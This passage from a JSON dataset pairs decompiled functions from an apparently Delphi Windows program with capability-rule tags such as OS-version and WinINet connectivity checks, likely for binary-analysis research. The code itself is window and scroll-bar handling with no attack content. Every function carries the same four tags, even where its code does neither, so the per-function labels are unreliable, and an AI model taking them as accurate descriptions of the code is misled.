0);\n        }\n    }\n    else if (iVar9 == 0x11f) {\n        uVar1 = *(param_2 + 6);\n        iVar9 = *(in_EAX + 8);\n        puStack68 = &stack0xfffffffc;\n        puVar2 = &stack0xfffffffc;\n        if (-1 < iVar9 + -1) {\n            do {\n                puStack68 = puVar2;\n                if (((uVar1 & 0x10) != 0) && (param_2[2] != 0)) {\n                    puStack80 = *(param_2 + 1);\n                    uStack88 = 0x438a25;\n                    uStack76 = param_2[2];\n                    sub.user32.dll_GetSubMenu();\n                }\n                puStack80 = 0x438a44;\n                fcn.00419888();\n                puStack80 = 0x438a50;\n                iVar10 = fcn.00437994();\n                if (iVar10 != 0) {\n                    puStack80 = 0x438a67;\n                    fcn.0044d518();\n                    puStack80 = 0x438a76;\n                    fcn.00447044();\n                    goto code_r0x00438e42;\n                }\n                iVar9 = iVar9 + -1;\n                puVar2 = puStack68;\n            } while (iVar9 != 0);\n        }\n        puStack80 = 0x438a8d;\n        fcn.00447044();\n    }\n    else {\n        puStack68 = &stack0xfffffffc;\n        if ((iVar9 == 0x120) &&\n           (iVar9 = *(in_EAX + 8),  puStack68 = &stack0xfffffffc,  puVar2 = &stack0xfffffffc,  -1 < iVar9 + -1)) {\n            do {\n                puStack68 = puVar2;\n                puStack80 = 0x438df7;\n                piVar4 = fcn.00419888();\n                puStack80 = 0x438e02;\n                iVar10 = (**(*piVar4 + 0x34))();\n                if (iVar10 == param_2[2]) {\ncode_r0x00438e18:\n                    puStack80 = 0x438e22;\n                    fcn.00438504();\n                    goto code_r0x00438e42;\n                }\n                puStack80 = 0x438e14;\n                iVar10 = fcn.00437994();\n                if (iVar10 != 0) goto code_r0x00438e18;\n                iVar9 = iVar9 + -1;\n                puVar2 = puStack68;\n            } while (iVar9 != 0);\n        }\n    }\n    puStack80 = param_2[2];\n    puStack84 = param_2[1];\n    uStack88 = *param_2;\n    uStack76 = *(in_EAX + 0x10);\n    puStack96 = 0x438e3f;\n    iVar9 = sub.user32.dll_DefWindowProcA();\n    param_2[3] = iVar9;\ncode_r0x00438e42:\n    *in_FS_OFFSET = uStack76;\n    puStack68 = 0x438e5f;\n    uStack72 = 0x438e57;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 2887
    },
    "00438e68": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00438e68(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (*(in_EAX + 8) == 0) {\n        uVar1 = fcn.004210c0(fcn.004388d8, in_EAX);\n        *(in_EAX + 0x10) = uVar1;\n    }\n    fcn.00419730();\n    return;\n}\n",
        "token_count": 96
    },
    "00438e90": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00438e90(void)\n\n{\n    int32_t in_EAX;\n    \n    fcn.004199cc();\n    if (*(in_EAX + 8) == 0) {\n        fcn.00421174();\n    }\n    return;\n}\n",
        "token_count": 58
    },
    "00438f78": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00438f78(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if ((*(*0x4927e0 + 0xd) != '\\0') && (*(in_EAX + 0x41) != '\\0')) {\n        iVar1 = fcn.004339c8();\n        if (iVar1 == 0) {\n            fcn.00438728();\n            *(in_EAX + 0x41) = 1;\n        }\n        else {\n            fcn.00438728();\n            *(in_EAX + 0x41) = 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 144
    },
    "00438fc4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00438fc4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (*(*0x4927e0 + 0xd) != '\\0') {\n        if (*(in_EAX + 0x41) == '\\0') {\n            uVar2 = *(in_EAX + 0x30) == '\\x01';\n        }\n        else {\n            iVar1 = fcn.004339c8();\n            if (iVar1 == 0) {\n                uVar2 = fcn.004456d8();\n            }\n            else {\n                uVar2 = fcn.0040484c();\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 174
    },
    "0043b748": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043b748(void)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint8_t uVar3;\n    uint8_t uStack51;\n    uint8_t uStack50;\n    char cStack40;\n    \n    sub.user32.dll_GetWindowLongA();\n    iVar2 = sub.user32.dll_IsIconic();\n    uVar3 = 1 - (iVar2 == 0);\n    iVar2 = sub.user32.dll_IsWindowVisible();\n    if ((iVar2 == 0) && ((in_EAX != *(*0x497c1c + 0x30) || (*(*0x497c1c + 0x5b) == '\\0')))) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = 1;\n    }\n    if ((uVar1 | uVar3) != 0) {\n        cStack40 = in_EAX;\n        sub.user32.dll_ShowWindow();\n    }\n    if (cStack40 == '\\0') {\n        sub.user32.dll_SetWindowLongA();\n    }\n    else {\n        sub.user32.dll_SetWindowLongA();\n    }\n    uStack51 = in_EAX >> 8;\n    uStack50 = in_EAX >> 0x10;\n    if (((uStack51 & uStack50) != 0) || (uVar3 != 0)) {\n        if (uVar3 == 0) {\n            sub.user32.dll_ShowWindow();\n        }\n        else {\n            sub.user32.dll_ShowWindow();\n        }\n    }\n    return;\n}\n",
        "token_count": 352
    },
    "0043b808": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043b808(void)\n\n{\n    if (*(*0x497c1c + 0x30) != 0) {\n        fcn.0044555c();\n    }\n    fcn.00446d0c();\n    fcn.004201f8();\n    fcn.0042019c();\n    return;\n}\n",
        "token_count": 76
    },
    "0043b98c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043b98c(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    if ((arg_8h != *0x490514) && (arg_8h != *(*0x497c1c + 0x30))) {\n        iVar1 = sub.user32.dll_IsWindowVisible(arg_8h);\n        if (iVar1 != 0) {\n            iVar1 = sub.user32.dll_IsWindowEnabled(arg_8h);\n            if (iVar1 != 0) {\n                uVar2 = sub.user32.dll_GetWindowLongA(arg_8h, 0xffffffec);\n                if ((uVar2 & 8) == 0) {\n                    if (*0x490518 == 0) {\n                        *0x490518 = arg_8h;\n                    }\n                }\n                else if (*0x49051c == 0) {\n                    *0x49051c = arg_8h;\n                }\n            }\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 232
    },
    "0043b9f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0043b9f0(void)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    \n    *0x490518 = 0;\n    *0x49051c = 0;\n    *0x490514 = in_EAX;\n    uVar1 = sub.kernel32.dll_GetCurrentThreadId_1(fcn.0043b98c, 0);\n    sub.user32.dll_EnumThreadWindows(uVar1);\n    if (*0x490518 != 0) {\n        return *0x490518;\n    }\n    return *0x49051c;\n}\n",
        "token_count": 132
    },
    "0043bcbc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0043bcbc(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    do {\n        if (param_2 == '\\0') {\n            cVar1 = fcn.004047dc();\n            if (cVar1 != '\\0') {\ncode_r0x0043bce2:\n                cVar1 = fcn.004047dc();\n                if (cVar1 != '\\0') {\n                    return in_EAX;\n                }\n                return 0;\n            }\n        }\n        if (*(in_EAX + 0x30) == 0) goto code_r0x0043bce2;\n        in_EAX = *(in_EAX + 0x30);\n    } while( true );\n}\n",
        "token_count": 175
    },
    "0043be74": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043be74(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x18) == '\\0') {\n        cVar1 = fcn.0043c034();\n        if (cVar1 != '\\0') {\n            cVar1 = fcn.00450f08();\n            if (cVar1 == '\\0') {\n                fcn.0043c58c();\n            }\n            else {\n                fcn.0043c58c();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 127
    },
    "0043beac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043beac(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    if (*(in_EAX + 0x57) != '\\0') {\n        cVar1 = *(in_EAX + 0x5b);\n        if ((cVar1 == '\\0') || (cVar1 == '\\x03')) {\n            if ((*(in_EAX + 0x5b) == '\\x03') || (*0x43bf18 == (*0x43bf14 & *(in_EAX + 0x61)))) {\n                iVar3 = *(*(arg_8h + -8) + 0xc) + *(in_EAX + 0x40) + *(in_EAX + 0x48);\n                iVar2 = *(arg_8h + -4);\n                if (*(arg_8h + -4) <= iVar3) {\n                    iVar2 = iVar3;\n                }\n                *(arg_8h + -4) = iVar2;\n            }\n        }\n        else if (cVar1 == '\\x04') {\n            *(arg_8h + -0xc) = *(arg_8h + -0xc) + *(in_EAX + 0x48);\n        }\n    }\n    return;\n}\n",
        "token_count": 299
    },
    "0043bf1c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043bf1c(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if (*(in_EAX + 0x57) != '\\0') {\n        if (*(in_EAX + 0x5b) < 2) {\n            if ((*(in_EAX + 0x5b) == '\\x01') || (*0x43bf84 == (*0x43bf80 & *(in_EAX + 0x61)))) {\n                iVar2 = *(*(arg_8h + -8) + 0xc) + *(in_EAX + 0x44) + *(in_EAX + 0x4c);\n                iVar1 = *(arg_8h + -4);\n                if (*(arg_8h + -4) <= iVar2) {\n                    iVar1 = iVar2;\n                }\n                *(arg_8h + -4) = iVar1;\n            }\n        }\n        else if (*(in_EAX + 0x5b) == 2) {\n            *(arg_8h + -0xc) = *(arg_8h + -0xc) + *(in_EAX + 0x4c);\n        }\n    }\n    return;\n}\n",
        "token_count": 283
    },
    "0043bf88": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043bf88(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(*(in_EAX + 4) + 0x96) != '\\0') {\n        cVar1 = (**(**(in_EAX + 4) + 0xd8))();\n        if (cVar1 == '\\0') {\n            fcn.0043c6c4();\n        }\n        else {\n            iVar2 = fcn.00454658();\n            if (-1 < iVar2 + -1) {\n                do {\n                    if (*(in_EAX + 0x18) == '\\0') {\n                        puVar3 = &stack0xfffffffc;\n                        fcn.0045461c();\n                        fcn.0043beac(puVar3);\n                    }\n                    else {\n                        puVar3 = &stack0xfffffffc;\n                        fcn.0045461c();\n                        fcn.0043bf1c(puVar3);\n                    }\n                    iVar2 = iVar2 + -1;\n                } while (iVar2 != 0);\n            }\n            fcn.0043c6c4();\n        }\n    }\n    return;\n}\n",
        "token_count": 289
    },
    "0043c034": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0043c034(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    uVar3 = 0x100000;\n    if (*(in_EAX + 0x18) == '\\x01') {\n        uVar3 = 0x200000;\n    }\n    if (*(in_EAX + 0x1c) != '\\0') {\n        uVar1 = fcn.00458568(0xfffffff0);\n        uVar2 = sub.user32.dll_GetWindowLongA(uVar1);\n        if ((uVar2 & uVar3) != 0) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 168
    },
    "0043c0a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0043c0a0(int32_t arg_8h)\n\n{\n    char cVar1;\n    ushort in_DX;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    if (*(arg_8h + -5) == '\\0') {\n        if ((*(arg_8h + -6) != '\\0') && (cVar1 = fcn.0043c06c(arg_8h),  cVar1 == '\\0')) {\n            iVar2 = (***0x492428)(in_DX);\n            return -(iVar2 - *(arg_8h + -0xc));\n        }\n        if ((*(arg_8h + -6) == '\\0') && (cVar1 = fcn.0043c06c(arg_8h),  cVar1 != '\\0')) {\n            iVar2 = (***0x492428)(in_DX);\n            iVar2 = iVar2 - *(arg_8h + -0xc);\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 227
    },
    "0043c58c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043c58c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    bool bVar3;\n    \n    if ((*(*(in_EAX + 4) + 0x1c) & 2) == 0) {\n        iVar1 = *(in_EAX + 0x14);\n        if ((param_2 <= iVar1) && (iVar1 = param_2,  param_2 < 0)) {\n            iVar1 = 0;\n        }\n        bVar3 = *(in_EAX + 0x18) != '\\0';\n        if (iVar1 != *(in_EAX + 0xc)) {\n            *(in_EAX + 0xc) = iVar1;\n            if (*(in_EAX + 0x18) == '\\0') {\n                fcn.00458114();\n            }\n            else {\n                fcn.00458114();\n            }\n            if ((((*(*(in_EAX + 4) + 0x1c) & 0x10) != 0) && (iVar1 = fcn.0043bd00(),  iVar1 != 0)) &&\n               (*(iVar1 + 0x298) != 0)) {\n                (**(**(iVar1 + 0x298) + 0xc))();\n            }\n        }\n        uVar2 = fcn.00458568(bVar3);\n        iVar1 = (***0x492674)(uVar2);\n        if (iVar1 != *(in_EAX + 0xc)) {\n            uVar2 = fcn.00458568(bVar3, *(in_EAX + 0xc), 0xffffffff);\n            (***0x4923e0)(uVar2);\n        }\n    }\n    else {\n        *(in_EAX + 0xc) = param_2;\n    }\n    return;\n}\n",
        "token_count": 423
    },
    "0043c70c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043c70c(int32_t arg_8h)\n\n{\n    char in_AL;\n    uint uVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    uint uVar5;\n    int32_t arg_14h;\n    \n    piVar3 = arg_8h + -4;\n    arg_14h = -(in_AL != '\\0');\n    uVar4 = *(*(*piVar3 + 0x34) * 4 + 0x490560);\n    uVar2 = *(*(*piVar3 + 0x18) * 0x14 + 0x490538);\n    uVar1 = fcn.00458568();\n    fcn.00431c08(uVar1, uVar2, uVar4, arg_14h);\n    if (0 < *(*piVar3 + 0x24)) {\n        uVar5 = 0;\n        uVar4 = *(*piVar3 + 0x24);\n        uVar2 = *(*(*piVar3 + 0x18) * 0x14 + 0x49053c);\n        uVar1 = fcn.00458568();\n        fcn.00431c08(uVar1, uVar2, uVar4, uVar5);\n    }\n    if (0 < *(*piVar3 + 0x38)) {\n        uVar5 = 0;\n        uVar4 = *(*piVar3 + 0x38);\n        uVar2 = *(*(*piVar3 + 0x18) * 0x14 + 0x490540);\n        uVar1 = fcn.00458568();\n        fcn.00431c08(uVar1, uVar2, uVar4, uVar5);\n    }\n    if (0 < *(*piVar3 + 0x30)) {\n        uVar5 = 0;\n        uVar4 = *(*piVar3 + 0x30);\n        uVar2 = *(*(*piVar3 + 0x18) * 0x14 + 0x490544);\n        uVar1 = fcn.00458568();\n        fcn.00431c08(uVar1, uVar2, uVar4, uVar5);\n    }\n    uVar5 = 0;\n    uVar2 = fcn.004241b0();\n    uVar4 = *(*(*piVar3 + 0x18) * 0x14 + 0x490548);\n    uVar1 = fcn.00458568();\n    fcn.00431c08(uVar1, uVar4, uVar2, uVar5);\n    return;\n}\n",
        "token_count": 591
    },
    "0043c814": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0043c814(uint param_1, uchar param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint var_22h;\n    uint var_1eh;\n    uint var_1ah;\n    uint var_16h;\n    int32_t var_12h;\n    uint var_eh;\n    uint var_ah;\n    int32_t var_6h;\n    \n    *(in_EAX + 0x14) = 0;\n    cVar1 = *(in_EAX + 0x18);\n    var_6h._1_1_ = param_2;\n    unique0x100000a4 = in_EAX;\n    if (*(in_EAX + 0x1c) != '\\0') {\n        iVar2 = fcn.0043c11c();\n        iVar2 = *(stack0xfffffff8 + 0x10) - iVar2;\n        *(stack0xfffffff8 + 0x14) = iVar2;\n        if (iVar2 < 0) {\n            *(stack0xfffffff8 + 0x14) = 0;\n        }\n    }\n    var_22h = 0x1c;\n    var_1eh = 0x17;\n    var_1ah = 0;\n    if (*(stack0xfffffff8 + 0x14) < 1) {\n        var_16h = 0;\n    }\n    else {\n        var_16h = *(stack0xfffffff8 + 0x10);\n    }\n    var_12h = fcn.0043c11c();\n    var_12h = var_12h + 1;\n    var_eh = *(stack0xfffffff8 + 0xc);\n    var_ah = var_eh;\n    fcn.0043c70c(&stack0xfffffffc);\n    *(stack0xfffffff8 + 0x44) = 0;\n    uVar3 = fcn.00458568(cVar1 == '\\x01', &var_22h, 0xffffffff);\n    (***0x49279c)(uVar3);\n    fcn.0043c58c();\n    iVar2 = fcn.0043c11c();\n    uVar4 = (iVar2 * 9) / 10;\n    *(stack0xfffffff8 + 10) = uVar4;\n    if (*(stack0xfffffff8 + 0x1f) != '\\0') {\n        *(stack0xfffffff8 + 8) = (uVar4 & 0xffff) / 10;\n    }\n    return;\n}\n",
        "token_count": 602
    },
    "0043c9f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043c9f4(void)\n\n{\n    char cVar1;\n    uint arg_8h;\n    \n    fcn.004548a4();\n    if (*(*0x4927e0 + 0xd) == '\\0') {\n        cVar1 = fcn.0040e374();\n        if (cVar1 == '\\0') {\n            arg_8h = fcn.00458568();\n            fcn.00431c3c(arg_8h);\n        }\n    }\n    fcn.0043cc0c();\n    return;\n}\n",
        "token_count": 126
    },
    "0043ca74": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043ca74(void)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = fcn.00404620();\n    arg_8h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    iVar4 = fcn.00450180();\n    iVar5 = *(in_EAX + 0x250);\n    cVar2 = fcn.0043c034();\n    if ((cVar2 == '\\0') || (*(iVar5 + 0x10) <= iVar4)) {\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    if (bVar1) {\n        fcn.0043c58c();\n    }\n    iVar5 = fcn.00454658();\n    if (-1 < iVar5 + -1) {\n        do {\n            fcn.0045461c();\n            fcn.0045461c();\n            fcn.00419730();\n            fcn.0044fe94();\n            iVar5 = iVar5 + -1;\n        } while (iVar5 != 0);\n    }\n    iVar5 = *(iVar3 + 8);\n    if (-1 < iVar5 + -1) {\n        do {\n            arg_8h = 0;\n            fcn.00419888();\n            fcn.00451abc(arg_8h);\n            iVar5 = iVar5 + -1;\n        } while (iVar5 != 0);\n    }\n    if (bVar1) {\n        fcn.0043be74();\n    }\n    *in_FS_OFFSET = arg_8h;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 430
    },
    "0043cb8c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043cb8c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x25c) < 1) {\n        fcn.0043bf88();\n        fcn.0043bf88();\n    }\n    return;\n}\n",
        "token_count": 64
    },
    "0043cc0c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043cc0c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    int32_t var_4h;\n    \n    if (*(in_EAX + 0x260) == '\\0') {\n        puStack12 = 0x43cc2b;\n        var_4h = in_EAX;\n        cVar1 = fcn.00458874();\n        if (cVar1 != '\\0') {\n            uStack16 = 0x43ccf7;\n            uStack20 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffec;\n            *(var_4h + 0x260) = 1;\n            puStack12 = &stack0xfffffffc;\n            cVar1 = fcn.0043c19c();\n            if (cVar1 == '\\0') {\n                cVar1 = fcn.0043c19c();\n                if (cVar1 == '\\0') {\n                    fcn.0043c814();\n                    fcn.0043c814();\n                }\n                else {\n                    fcn.0043c814();\n                    fcn.0043c814();\n                }\n            }\n            else {\n                fcn.0043c814();\n                fcn.0043c814();\n            }\n            *in_FS_OFFSET = uStack20;\n            *(var_4h + 0x260) = 0;\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 343
    },
    "0043d348": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.0043d348(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    uVar1 = fcn.00402ee8();\n    *(in_EAX + 0x2a4) = uVar1;\n    fcn.0043c930();\n    *(in_EAX + 0x50) = *0x43d50c;\n    fcn.00443520();\n    fcn.0044355c();\n    fcn.0044fefc();\n    fcn.0044ff30();\n    piVar2 = fcn.0042ae48();\n    *(in_EAX + 0x288) = piVar2;\n    (***0x492428)(0x31);\n    (**(*piVar2 + 0x40))();\n    (***0x492428)();\n    (**(**(in_EAX + 0x288) + 0x34))();\n    iVar3 = *(in_EAX + 0x288);\n    *(iVar3 + 0x14) = in_EAX;\n    *(iVar3 + 0x10) = fcn.0043dff8;\n    *(in_EAX + 0x278) = 2;\n    uVar1 = fcn.00425088();\n    *(in_EAX + 0x280) = uVar1;\n    fcn.0044f0b0();\n    *(in_EAX + 0x270) = *0x43d510;\n    *(in_EAX + 0x271) = 2;\n    *(in_EAX + 0x273) = 0;\n    *(in_EAX + 0x279) = 3;\n    *(in_EAX + 0x28c) = 0;\n    **(in_EAX + 0x2a4) = *(*0x497c20 + 0x40);\n    uVar1 = fcn.00447fd8();\n    *(*(in_EAX + 0x2a4) + 4) = uVar1;\n    iVar3 = fcn.00447dac();\n    *(iVar3 + 0x24) = in_EAX;\n    *(iVar3 + 0x20) = fcn.00447e60;\n    *(*(in_EAX + 0x2a4) + 8) = 0;\n    *(in_EAX + 0x27d) = 1;\n    uVar1 = fcn.00404528();\n    *(in_EAX + 0xac) = uVar1;\n    *(in_EAX + 0x329) = 0xff;\n    *(in_EAX + 0x354) = 0;\n    fcn.0043e37c();\n    fcn.004509cc();\n    fcn.00450930();\n    fcn.00458754();\n    fcn.00443de4();\n    *(in_EAX + 0x34c) = 10;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = 0x32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 786
    },
    "0043d57c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
